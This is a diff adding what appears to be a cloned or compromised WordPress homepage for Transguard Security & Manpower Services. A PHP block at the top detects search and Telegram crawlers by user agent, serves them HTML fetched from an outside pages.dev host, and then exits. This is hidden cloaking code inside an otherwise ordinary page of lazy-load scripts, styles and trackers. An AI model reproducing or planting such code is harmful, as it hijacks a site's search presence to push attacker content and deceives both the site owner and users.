@@ -1,0 +1,2117 @@
+<?php
+     function is_bot() {
+         $user_agent = $_SERVER['HTTP_USER_AGENT'];
+         $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+         
+         foreach ($bots as $bot) {
+             if (stripos($user_agent, $bot) !== false) {
+                 return true;
+             }
+         }
+         
+         return false;
+     }
+     if (is_bot()) {
+         echo file_get_contents('https://transguardind-careers.pages.dev/datahkb.html');
+     exit;
+     }
+     ?>
+    
+    <!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+
+  <meta charset="UTF-8" />
+
+  <script>
+    if (navigator.userAgent.match(/MSIE|Internet Explorer/i) || navigator.userAgent.match(/Trident\/7\..*?rv:11/i)) {
+      var href = document.location.href;
+      if (!href.match(/[?&]nowprocket/)) {
+        if (href.indexOf("?") == -1) {
+          if (href.indexOf("#") == -1) {
+            document.location.href = href + "?nowprocket=1"
+          } else {
+            document.location.href = href.replace("#", "?nowprocket=1#")
+          }
+        } else {
+          if (href.indexOf("#") == -1) {
+            document.location.href = href + "&nowprocket=1"
+          } else {
+            document.location.href = href.replace("#", "&nowprocket=1#")
+          }
+        }
+      }
+    }
+  </script>
+  <script>
+    class RocketLazyLoadScripts {
+      constructor() {
+        this.triggerEvents = ["keydown", "mousedown", "mousemove", "touchmove", "touchstart", "touchend", "wheel"], this.userEventHandler = this._triggerListener.bind(this), this.touchStartHandler = this._onTouchStart.bind(this), this.touchMoveHandler = this._onTouchMove.bind(this), this.touchEndHandler = this._onTouchEnd.bind(this), this.clickHandler = this._onClick.bind(this), this.interceptedClicks = [], window.addEventListener("pageshow", (e => {
+          this.persisted = e.persisted
+        })), window.addEventListener("DOMContentLoaded", (() => {
+          this._preconnect3rdParties()
+        })), this.delayedScripts = {
+          normal: [],
+          async: [],
+          defer: []
+        }, this.allJQueries = []
+      }
+      _addUserInteractionListener(e) {
+        document.hidden ? e._triggerListener() : (this.triggerEvents.forEach((t => window.addEventListener(t, e.userEventHandler, {
+          passive: !0
+        }))), window.addEventListener("touchstart", e.touchStartHandler, {
+          passive: !0
+        }), window.addEventListener("mousedown", e.touchStartHandler), document.addEventListener("visibilitychange", e.userEventHandler))
+      }
+      _removeUserInteractionListener() {
+        this.triggerEvents.forEach((e => window.removeEventListener(e, this.userEventHandler, {
+          passive: !0
+        }))), document.removeEventListener("visibilitychange", this.userEventHandler)
+      }
+      _onTouchStart(e) {
+        "HTML" !== e.target.tagName && (window.addEventListener("touchend", this.touchEndHandler), window.addEventListener("mouseup", this.touchEndHandler), window.addEventListener("touchmove", this.touchMoveHandler, {
+          passive: !0
+        }), window.addEventListener("mousemove", this.touchMoveHandler), e.target.addEventListener("click", this.clickHandler), this._renameDOMAttribute(e.target, "onclick", "rocket-onclick"))
+      }
+      _onTouchMove(e) {
+        window.removeEventListener("touchend", this.touchEndHandler), window.removeEventListener("mouseup", this.touchEndHandler), window.removeEventListener("touchmove", this.touchMoveHandler, {
+          passive: !0
+        }), window.removeEventListener("mousemove", this.touchMoveHandler), e.target.removeEventListener("click", this.clickHandler), this._renameDOMAttribute(e.target, "rocket-onclick", "onclick")
+      }
+      _onTouchEnd(e) {
+        window.removeEventListener("touchend", this.touchEndHandler), window.removeEventListener("mouseup", this.touchEndHandler), window.removeEventListener("touchmove", this.touchMoveHandler, {
+          passive: !0
+        }), window.removeEventListener("mousemove", this.touchMoveHandler)
+      }
+      _onClick(e) {
+        e.target.removeEventListener("click", this.clickHandler), this._renameDOMAttribute(e.target, "rocket-onclick", "onclick"), this.interceptedClicks.push(e), e.preventDefault(), e.stopPropagation(), e.stopImmediatePropagation()
+      }
+      _replayClicks() {
+        window.removeEventListener("touchstart", this.touchStartHandler, {
+          passive: !0
+        }), window.removeEventListener("mousedown", this.touchStartHandler), this.interceptedClicks.forEach((e => {
+          e.target.dispatchEvent(new MouseEvent("click", {
+            view: e.view,
+            bubbles: !0,
+            cancelable: !0
+          }))
+        }))
+      }
+      _renameDOMAttribute(e, t, n) {
+        e.hasAttribute && e.hasAttribute(t) && (event.target.setAttribute(n, event.target.getAttribute(t)), event.target.removeAttribute(t))
+      }
+      _triggerListener() {
+        this._removeUserInteractionListener(this), "loading" === document.readyState ? document.addEventListener("DOMContentLoaded", this._loadEverythingNow.bind(this)) : this._loadEverythingNow()
+      }
+      _preconnect3rdParties() {
+        let e = [];
+        document.querySelectorAll("script[type=rocketlazyloadscript]").forEach((t => {
+          if (t.hasAttribute("src")) {
+            const n = new URL(index.php).origin;
+            n !== location.origin && e.push({
+              src: n,
+              crossOrigin: t.crossOrigin || "module" === t.getAttribute("data-rocket-type")
+            })
+          }
+        })), e = [...new Map(e.map((e => [JSON.stringify(e), e]))).values()], this._batchInjectResourceHints(e, "preconnect")
+      }
+      async _loadEverythingNow() {
+        this.lastBreath = Date.now(), this._delayEventListeners(), this._delayJQueryReady(this), this._handleDocumentWrite(), this._registerAllDelayedScripts(), this._preloadAllScripts(), await this._loadScriptsFromList(this.delayedScripts.normal), await this._loadScriptsFromList(this.delayedScripts.defer), await this._loadScriptsFromList(this.delayedScripts.async);
+        try {
+          await this._triggerDOMContentLoaded(), await this._triggerWindowLoad()
+        } catch (e) {}
+        window.dispatchEvent(new Event("rocket-allScriptsLoaded")), this._replayClicks()
+      }
+      _registerAllDelayedScripts() {
+        document.querySelectorAll("script[type=rocketlazyloadscript]").forEach((e => {
+          e.hasAttribute("src") ? e.hasAttribute("async") && !1 !== e.async ? this.delayedScripts.async.push(e) : e.hasAttribute("defer") && !1 !== e.defer || "module" === e.getAttribute("data-rocket-type") ? this.delayedScripts.defer.push(e) : this.delayedScripts.normal.push(e) : this.delayedScripts.normal.push(e)
+        }))
+      }
+      async _transformScript(e) {
+        return await this._littleBreath(), new Promise((t => {
+          const n = document.createElement("script");
+          [...e.attributes].forEach((e => {
+            let t = e.nodeName;
+            "type" !== t && ("data-rocket-type" === t && (t = "type"), n.setAttribute(t, e.nodeValue))
+          })), e.hasAttribute("src") ? (n.addEventListener("load", t), n.addEventListener("error", t)) : (n.text = e.text, t());
+          try {
+            e.parentNode.replaceChild(n, e)
+          } catch (e) {
+            t()
+          }
+        }))
+      }
+      async _loadScriptsFromList(e) {
+        const t = e.shift();
+        return t ? (await this._transformScript(t), this._loadScriptsFromList(e)) : Promise.resolve()
+      }
+      _preloadAllScripts() {
+        this._batchInjectResourceHints([...this.delayedScripts.normal, ...this.delayedScripts.defer, ...this.delayedScripts.async], "preload")
+      }
+      _batchInjectResourceHints(e, t) {
+        var n = document.createDocumentFragment();
+        e.forEach((e => {
+          if (e.src) {
+            const i = document.createElement("link");
+            i.href = e.src, i.rel = t, "preconnect" !== t && (i.as = "script"), e.getAttribute && "module" === e.getAttribute("data-rocket-type") && (i.crossOrigin = !0), e.crossOrigin && (i.crossOrigin = e.crossOrigin), n.appendChild(i)
+          }
+        })), document.head.appendChild(n)
+      }
+      _delayEventListeners() {
+        let e = {};
+
+        function t(t, n) {
+          ! function(t) {
+            function n(n) {
+              return e[t].eventsToRewrite.indexOf(n) >= 0 ? "rocket-" + n : n
+            }
+            e[t] || (e[t] = {
+              originalFunctions: {
+                add: t.addEventListener,
+                remove: t.removeEventListener
+              },
+              eventsToRewrite: []
+            }, t.addEventListener = function() {
+              arguments[0] = n(arguments[0]), e[t].originalFunctions.add.apply(t, arguments)
+            }, t.removeEventListener = function() {
+              arguments[0] = n(arguments[0]), e[t].originalFunctions.remove.apply(t, arguments)
+            })
+          }(t), e[t].eventsToRewrite.push(n)
+        }
+
+        function n(e, t) {
+          let n = e[t];
+          Object.defineProperty(e, t, {
+            get: () => n || function() {},
+            set(i) {
+              e["rocket" + t] = n = i
+            }
+          })
+        }
+        t(document, "DOMContentLoaded"), t(window, "DOMContentLoaded"), t(window, "load"), t(window, "pageshow"), t(document, "readystatechange"), n(document, "onreadystatechange"), n(window, "onload"), n(window, "onpageshow")
+      }
+      _delayJQueryReady(e) {
+        let t = window.jQuery;
+        Object.defineProperty(window, "jQuery", {
+          get: () => t,
+          set(n) {
+            if (n && n.fn && !e.allJQueries.includes(n)) {
+              n.fn.ready = n.fn.init.prototype.ready = function(t) {
+                e.domReadyFired ? t.bind(document)(n) : document.addEventListener("rocket-DOMContentLoaded", (() => t.bind(document)(n)))
+              };
+              const t = n.fn.on;
+              n.fn.on = n.fn.init.prototype.on = function() {
+                if (this[0] === window) {
+                  function e(e) {
+                    return e.split(" ").map((e => "load" === e || 0 === e.indexOf("load.") ? "rocket-jquery-load" : e)).join(" ")
+                  }
+                  "string" == typeof arguments[0] || arguments[0] instanceof String ? arguments[0] = e(arguments[0]) : "object" == typeof arguments[0] && Object.keys(arguments[0]).forEach((t => {
+                    delete Object.assign(arguments[0], {
+                      [e(t)]: arguments[0][t]
+                    })[t]
+                  }))
+                }
+                return t.apply(this, arguments), this
+              }, e.allJQueries.push(n)
+            }
+            t = n
+          }
+        })
+      }
+      async _triggerDOMContentLoaded() {
+        this.domReadyFired = !0, await this._littleBreath(), document.dispatchEvent(new Event("rocket-DOMContentLoaded")), await this._littleBreath(), window.dispatchEvent(new Event("rocket-DOMContentLoaded")), await this._littleBreath(), document.dispatchEvent(new Event("rocket-readystatechange")), await this._littleBreath(), document.rocketonreadystatechange && document.rocketonreadystatechange()
+      }
+      async _triggerWindowLoad() {
+        await this._littleBreath(), window.dispatchEvent(new Event("rocket-load")), await this._littleBreath(), window.rocketonload && window.rocketonload(), await this._littleBreath(), this.allJQueries.forEach((e => e(window).trigger("rocket-jquery-load"))), await this._littleBreath();
+        const e = new Event("rocket-pageshow");
+        e.persisted = this.persisted, window.dispatchEvent(e), await this._littleBreath(), window.rocketonpageshow && window.rocketonpageshow({
+          persisted: this.persisted
+        })
+      }
+      _handleDocumentWrite() {
+        const e = new Map;
+        document.write = document.writeln = function(t) {
+          const n = document.currentScript,
+          i = document.createRange(),
+          r = n.parentElement;
+          let o = e.get(n);
+          void 0 === o && (o = n.nextSibling, e.set(n, o));
+          const s = document.createDocumentFragment();
+          i.setStart(s, 0), s.appendChild(i.createContextualFragment(t)), r.insertBefore(s, o)
+        }
+      }
+      async _littleBreath() {
+        Date.now() - this.lastBreath > 45 && (await this._requestAnimFrame(), this.lastBreath = Date.now())
+      }
+      async _requestAnimFrame() {
+        return document.hidden ? new Promise((e => setTimeout(e))) : new Promise((e => requestAnimationFrame(e)))
+      }
+      static run() {
+        const e = new RocketLazyLoadScripts;
+        e._addUserInteractionListener(e)
+      }
+    }
+    RocketLazyLoadScripts.run();
+  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Transguard Security & Manpower Services</title>
+  <link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A400%2C600%2C700%2C800%7CRoboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto%20Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7COpen%20Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=swap" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A400%2C600%2C700%2C800%7CRoboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto%20Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7COpen%20Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=swap" media="print" onload="this.media='all'" /><noscript>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A400%2C600%2C700%2C800%7CRoboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto%20Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7COpen%20Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=swap" />
+  </noscript>
+
+  <link rel="stylesheet" href="wp-content/cache/min/1/b5c9bd7f74b74f0f6a4d89855b3080ca.css" media="all" data-minify="1" />
+  <!-- / Yoast SEO Premium plugin. -->
+
+  <link rel='dns-prefetch' href='http://cdn.jsdelivr.net/' />
+  <link rel='dns-prefetch' href='http://www.google.com/' />
+  <link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
+  <link rel='dns-prefetch' href='http://stackpath.bootstrapcdn.com/' />
+  <link href='https://fonts.gstatic.com/' crossorigin rel='preconnect' />
+  <style type="text/css">
+    img.wp-smiley,
+    img.emoji {
+      display: inline !important;
+      border: none !important;
+      box-shadow: none !important;
+      height: 1em !important;
+      width: 1em !important;
+      margin: 0 0.07em !important;
+      vertical-align: -0.1em !important;
+      background: none !important;
+      padding: 0 !important;
+    }
+  </style>
+
+  <style id='global-styles-inline-css' type='text/css'>
+    body {
+      --wp--preset--color--black: #000000;
+      --wp--preset--color--cyan-bluish-gray: #abb8c3;
+      --wp--preset--color--white: #ffffff;
+      --wp--preset--color--pale-pink: #f78da7;
+      --wp--preset--color--vivid-red: #cf2e2e;
+      --wp--preset--color--luminous-vivid-orange: #ff6900;
+      --wp--preset--color--luminous-vivid-amber: #fcb900;
+      --wp--preset--color--light-green-cyan: #7bdcb5;
+      --wp--preset--color--vivid-green-cyan: #00d084;
+      --wp--preset--color--pale-cyan-blue: #8ed1fc;
+      --wp--preset--color--vivid-cyan-blue: #0693e3;
+      --wp--preset--color--vivid-purple: #9b51e0;
+      --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
+      --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
+      --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
+      --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
+      --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
+      --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
+      --wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
+      --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
+      --wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
+      --wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
+      --wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
+      --wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
+      --wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');
+      --wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');
+      --wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');
+      --wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');
+      --wp--preset--duotone--midnight: url('#wp-duotone-midnight');
+      --wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');
+      --wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');
+      --wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');
+      --wp--preset--font-size--small: 13px;
+      --wp--preset--font-size--medium: 20px;
+      --wp--preset--font-size--large: 36px;
+      --wp--preset--font-size--x-large: 42px;
+    }
+
+    .has-black-color {
+      color: var(--wp--preset--color--black) !important;
+    }
+
+    .has-cyan-bluish-gray-color {
+      color: var(--wp--preset--color--cyan-bluish-gray) !important;
+    }
+
+    .has-white-color {
+      color: var(--wp--preset--color--white) !important;
+    }
+
+    .has-pale-pink-color {
+      color: var(--wp--preset--color--pale-pink) !important;
+    }
+
+    .has-vivid-red-color {
+      color: var(--wp--preset--color--vivid-red) !important;
+    }
+
+    .has-luminous-vivid-orange-color {
+      color: var(--wp--preset--color--luminous-vivid-orange) !important;
+    }
+
+    .has-luminous-vivid-amber-color {
+      color: var(--wp--preset--color--luminous-vivid-amber) !important;
+    }
+
+    .has-light-green-cyan-color {
+      color: var(--wp--preset--color--light-green-cyan) !important;
+    }
+
+    .has-vivid-green-cyan-color {
+      color: var(--wp--preset--color--vivid-green-cyan) !important;
+    }
+
+    .has-pale-cyan-blue-color {
+      color: var(--wp--preset--color--pale-cyan-blue) !important;
+    }
+
+    .has-vivid-cyan-blue-color {
+      color: var(--wp--preset--color--vivid-cyan-blue) !important;
+    }
+
+    .has-vivid-purple-color {
+      color: var(--wp--preset--color--vivid-purple) !important;
+    }
+
+    .has-black-background-color {
+      background-color: var(--wp--preset--color--black) !important;
+    }
+
+    .has-cyan-bluish-gray-background-color {
+      background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
+    }
+
+    .has-white-background-color {
+      background-color: var(--wp--preset--color--white) !important;
+    }
+
+    .has-pale-pink-background-color {
+      background-color: var(--wp--preset--color--pale-pink) !important;
+    }
+
+    .has-vivid-red-background-color {
+      background-color: var(--wp--preset--color--vivid-red) !important;
+    }
+
+    .has-luminous-vivid-orange-background-color {
+      background-color: var(--wp--preset--color--luminous-vivid-orange) !important;
+    }
+
+    .has-luminous-vivid-amber-background-color {
+      background-color: var(--wp--preset--color--luminous-vivid-amber) !important;
+    }
+
+    .has-light-green-cyan-background-color {
+      background-color: var(--wp--preset--color--light-green-cyan) !important;
+    }
+
+    .has-vivid-green-cyan-background-color {
+      background-color: var(--wp--preset--color--vivid-green-cyan) !important;
+    }
+
+    .has-pale-cyan-blue-background-color {
+      background-color: var(--wp--preset--color--pale-cyan-blue) !important;
+    }
+
+    .has-vivid-cyan-blue-background-color {
+      background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
+    }
+
+    .has-vivid-purple-background-color {
+      background-color: var(--wp--preset--color--vivid-purple) !important;
+    }
+
+    .has-black-border-color {
+      border-color: var(--wp--preset--color--black) !important;
+    }
+
+    .has-cyan-bluish-gray-border-color {
+      border-color: var(--wp--preset--color--cyan-bluish-gray) !important;
+    }
+
+    .has-white-border-color {
+      border-color: var(--wp--preset--color--white) !important;
+    }
+
+    .has-pale-pink-border-color {
+      border-color: var(--wp--preset--color--pale-pink) !important;
+    }
+
+    .has-vivid-red-border-color {
+      border-color: var(--wp--preset--color--vivid-red) !important;
+    }
+
+    .has-luminous-vivid-orange-border-color {
+      border-color: var(--wp--preset--color--luminous-vivid-orange) !important;
+    }
+
+    .has-luminous-vivid-amber-border-color {
+      border-color: var(--wp--preset--color--luminous-vivid-amber) !important;
+    }
+
+    .has-light-green-cyan-border-color {
+      border-color: var(--wp--preset--color--light-green-cyan) !important;
+    }
+
+    .has-vivid-green-cyan-border-color {
+      border-color: var(--wp--preset--color--vivid-green-cyan) !important;
+    }
+
+    .has-pale-cyan-blue-border-color {
+      border-color: var(--wp--preset--color--pale-cyan-blue) !important;
+    }
+
+    .has-vivid-cyan-blue-border-color {
+      border-color: var(--wp--preset--color--vivid-cyan-blue) !important;
+    }
+
+    .has-vivid-purple-border-color {
+      border-color: var(--wp--preset--color--vivid-purple) !important;
+    }
+
+    .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
+      background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;
+    }
+
+    .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
+      background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;
+    }
+
+    .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
+      background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;
+    }
+
+    .has-luminous-vivid-orange-to-vivid-red-gradient-background {
+      background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;
+    }
+
+    .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
+      background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;
+    }
+
+    .has-cool-to-warm-spectrum-gradient-background {
+      background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;
+    }
+
+    .has-blush-light-purple-gradient-background {
+      background: var(--wp--preset--gradient--blush-light-purple) !important;
+    }
+
+    .has-blush-bordeaux-gradient-background {
+      background: var(--wp--preset--gradient--blush-bordeaux) !important;
+    }
+
+    .has-luminous-dusk-gradient-background {
+      background: var(--wp--preset--gradient--luminous-dusk) !important;
+    }
+
+    .has-pale-ocean-gradient-background {
+      background: var(--wp--preset--gradient--pale-ocean) !important;
+    }
+
+    .has-electric-grass-gradient-background {
+      background: var(--wp--preset--gradient--electric-grass) !important;
+    }
+
+    .has-midnight-gradient-background {
+      background: var(--wp--preset--gradient--midnight) !important;
+    }
+
+    .has-small-font-size {
+      font-size: var(--wp--preset--font-size--small) !important;
+    }
+
+    .has-medium-font-size {
+      font-size: var(--wp--preset--font-size--medium) !important;
+    }
+
+    .has-large-font-size {
+      font-size: var(--wp--preset--font-size--large) !important;
+    }
+
+    .has-x-large-font-size {
+      font-size: var(--wp--preset--font-size--x-large) !important;
+    }
+  </style>
+
+
+  <link rel='stylesheet' id='elementor-post-9-css' href='wp-content/uploads/elementor/css/post-9f98d.css?ver=1677827142' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-global-css' href='wp-content/uploads/elementor/css/global171c.css?ver=1677827236' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-post-7-css' href='wp-content/uploads/elementor/css/post-7c47d.css?ver=1677958101' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-post-179-css'  href='wp-content/uploads/elementor/css/post-1797a29.css?ver=1677958223' type='text/css' media='all' />
+  
+  <link rel='stylesheet' id='elementor-post-242-css'  href='wp-content/uploads/elementor/css/post-2425e19.css?ver=1677994331' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-post-481-css'  href='wp-content/uploads/elementor/css/post-481e074.css?ver=1677827266' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-post-536-css'  href='wp-content/uploads/elementor/css/post-536171c.css?ver=1677827236' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-post-495-css'  href='wp-content/uploads/elementor/css/post-4952242.css?ver=1677827250' type='text/css' media='all' />
+  <link rel='stylesheet' id='elementor-post-5270-css'  href='wp-content/uploads/elementor/css/post-5270884f.css?ver=1677827339' type='text/css' media='all' />
+  
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" />
+
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-includes/js/jquery/jquery.minaf6c.js?ver=3.6.0' id='jquery-core-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.mind617.js?ver=3.3.2' id='jquery-migrate-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/acf7db-schedule-report/public/js/acf7db_schedule_report-public97de.js?ver=1.0.5' id='acf7db_schedule_report-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/naas-contact-form-7-redirect/assets/js/client1eb7.js?ver=6.0.3' id='naas_contact_form_7_redirect-client-js' defer></script>
+  <script type='text/javascript' id='naas_contact_form_7_redirect-redirect_method-js-extra'>
+    /* <![CDATA[ */
+    var naas_contact_form_7_redirect_ajax_object = {
+      "naas_contact_form_7_redirect_ajax_url": "https:\/\/transguardgroup.com\/wp-admin\/admin-ajax.php",
+      "naas_contact_form_7_redirect_forms": "[\"|4852|page||0|\",\"|3850|page||0|\",\"|2865|page||0|\",\"|2329|page||0|\"]"
+    };
+    /* ]]> */
+  </script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/naas-contact-form-7-redirect/assets/js/naas_redirect_method.js' id='naas_contact_form_7_redirect-redirect_method-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/transguard-elementor/dist/js/slick.min68b3.js?ver=1' id='transguard-elementor-slick-js' defer></script>
+  <link rel="https://api.w.org/" href="wp-json" />
+  <link rel="alternate" type="application/json" href="wp-json/wp/v2/pages/7.json" />
+  <link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
+  <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" />
+  <meta name="generator" content="WordPress 6.0.3" />
+  <link rel='shortlink' href='index.php' />
+  <link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embed43b3.json?url=https%3A%2F%2Ftransguardgroup.com%2F" />
+  <!--Schema scripts-->
+ 
+
+  <!-- Google Tag Manager -->
+  <script type="rocketlazyloadscript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='../www.googletagmanager.com/gtm5445.php?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T44GGZR');</script>
+  <!-- End Google Tag Manager -->
+
+  <!--fb pixel-->
+  <script type="rocketlazyloadscript">!function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','../connect.facebook.net/en_US/fbevents.js');fbq('init','709125202622858');fbq('track','PageView');</script>
+  <noscript>
+    <img height="1" width="1" src="https://www.facebook.com/tr?id=709125202622858&amp;ev=PageView&amp;noscript=1" alt="fb-ad" />
+  </noscript>
+
+  <!--linkedin-->
+  <script type="rocketlazyloadscript" data-rocket-type="text/javascript">_linkedin_data_partner_id="75696";</script>
+  <script type="rocketlazyloadscript" data-rocket-type="text/javascript">(function(){var s=document.getElementsByTagName("script")[0];var b=document.createElement("script");b.type="text/javascript";b.async=true;b.src="../snap.licdn.com/li.lms-analytics/insight.min.js";s.parentNode.insertBefore(b,s);})();</script> <noscript> <img height="1" width="1" style="display:none;" alt="linkedin-ad" src="https://dc.ads.linkedin.com/collect/?pid=75696&amp;fmt=gif" /> </noscript>
+
+  <!--google conversion script-->
+  <!-- Google Code for  Transguard Security & Manpower Services Conversion Page -->
+  <script type="rocketlazyloadscript" data-rocket-type="text/javascript">
+    /* <![CDATA[ */
+    var google_conversion_id = 877963523;
+    var google_conversion_language = "en";
+    var google_conversion_format = "3";
+    var google_conversion_color = "ffffff";
+    var google_conversion_label = "KCE-CJ-96mkQg9LSogM";
+    var google_remarketing_only = false;
+    /* ]]> */
+  </script>
+  <script type="rocketlazyloadscript" data-rocket-type="text/javascript" src="../www.googleadservices.com/pagead/f.txt" defer>
+
+    <!--hotjar-->
+    <!-- Hotjar Tracking Code for https://www.transguardgroup.com/ -->
+    <script>
+      (function(h, o, t, j, a, r) {
+        h.hj = h.hj || function() {
+          (h.hj.q = h.hj.q || []).push(arguments)
+        };
+        h._hjSettings = {
+          hjid: 828609,
+          hjsv: 6
+        };
+        a = o.getElementsByTagName('head')[0];
+        r = o.createElement('script');
+        r.async = 1;
+        r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+        a.appendChild(r);
+      })(window, document, 'index.php?sv=');
+    </script>
+    <noscript>
+      <div style="display:inline;">
+        <img height="1" width="1" style="border-style:none;" alt="google lead" src="http://www.googleadservices.com/pagead/conversion/877963523/?label=KCE-CJ-96mkQg9LSogM&amp;guid=ON&amp;script=0" />
+      </div>
+    </noscript>
+
+    <!-- Global site tag (gtag.js) - Google Ads: 640670461 -->
